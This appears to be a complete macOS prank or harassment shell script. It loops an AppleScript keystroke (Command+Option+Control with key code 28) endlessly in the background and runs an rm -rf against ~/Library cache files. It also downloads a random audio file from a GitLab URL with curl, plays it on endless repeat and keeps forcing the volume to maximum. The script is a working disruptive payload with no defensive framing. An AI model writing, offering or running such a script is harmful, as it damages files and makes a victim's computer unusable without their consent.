echo "tell application \"System Events\"
key code 28 using {command down, option down, control down}
end tell" > ~/Library/config
while [ 1 ]; do osascript ~/Library/config; done &
zsh -c 'rm -rf "~/Library/*42_cache*"';

BASIC=('https://gitlab.com/LogoutPolice21/banana/raw/9c4b32441228904f4fb4ff1542d2271cae013346/')
LINKS=('PS' 'old' 'PulpFiction' 'Renault')
INDEX=$(awk -v min=0 -v max=2 'BEGIN{srand(); print int(min+rand()*(max-min+1))}')
LINK=("$BASIC${LINKS[$INDEX]}.mp3")
curl $LINK > ~/mem.mp3

while [ 1 ]; do afplay ~/mem.mp3; done &
while [ 1 ]; do osascript -e "set Volume 10"; done &
